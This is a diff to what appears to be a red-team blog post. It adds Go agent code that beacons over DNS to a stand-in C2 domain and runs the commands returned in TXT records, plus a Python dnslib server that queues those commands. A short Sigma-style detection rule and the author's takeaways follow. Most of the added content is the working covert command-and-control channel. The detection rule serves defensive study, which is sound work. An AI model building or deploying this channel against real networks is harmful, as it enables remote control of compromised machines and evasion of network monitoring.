@@ -17,4 +17,90 @@ DNS is almost always allowed outbound, even in heavily restricted environments. 
 
 I chose Go for its excellent cross-compilation support and small binary sizes. The agent compiles to a single static binary under 3MB that runs on Windows, Linux, and macOS.
 
-More details coming soon — this is a placeholder post.
+The core of the agent is a DNS resolver that encodes tasking data into subdomain labels and reads responses from TXT records:
+
+```go
+package main
+
+import (
+	"encoding/base32"
+	"fmt"
+	"net"
+	"strings"
+	"time"
+)
+
+const c2Domain = "cdn-telemetry.example.com"
+
+func beacon(agentID string, data []byte) (string, error) {
+	encoded := base32.StdEncoding.EncodeToString(data)
+	encoded = strings.TrimRight(strings.ToLower(encoded), "=")
+
+	qname := fmt.Sprintf("%s.%s.%s", encoded, agentID, c2Domain)
+
+	records, err := net.LookupTXT(qname)
+	if err != nil {
+		return "", fmt.Errorf("dns lookup failed: %w", err)
+	}
+	return strings.Join(records, ""), nil
+}
+
+func main() {
+	for {
+		resp, err := beacon("agent-0a3f", []byte("checkin"))
+		if err == nil && resp != "NOP" {
+			execute(resp)
+		}
+		time.Sleep(30 * time.Second)
+	}
+}
+```
+
+On the server side, a Python handler parses the incoming queries and queues commands:
+
+```python
+from dnslib import DNSRecord, RR, QTYPE, TXT
+from dnslib.server import DNSServer, BaseResolver
+
+class C2Resolver(BaseResolver):
+    def __init__(self):
+        self.task_queue = {}
+
+    def resolve(self, request, handler):
+        reply = request.reply()
+        qname = str(request.q.qname).rstrip(".")
+        labels = qname.split(".")
+
+        agent_id = labels[-3]
+        payload = labels[0]
+
+        task = self.task_queue.pop(agent_id, "NOP")
+        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(task), ttl=0))
+        return reply
+
+if __name__ == "__main__":
+    resolver = C2Resolver()
+    server = DNSServer(resolver, port=53, address="0.0.0.0")
+    server.start()
+```
+
+## Detection considerations
+
+From a blue team perspective, this traffic creates anomalies that are detectable with the right tooling. High-entropy subdomain labels and unusual TXT query volumes are strong indicators. During the engagement debrief, we recommended the SOC add the following Sigma-style detection logic:
+
+```yaml
+title: Suspicious DNS TXT Query Volume
+status: experimental
+logsource:
+  category: dns
+detection:
+  selection:
+    query_type: TXT
+  condition: selection | count(query) by src_ip > 50
+  timeframe: 5m
+level: medium
+```
+
+## Takeaways
+
+Building your own C2 channel is an invaluable learning exercise. It forces you to think at the protocol level — how data is encoded, how beaconing intervals affect detection, and how defenders can fingerprint custom tooling. Every red teamer should build at least one from scratch.
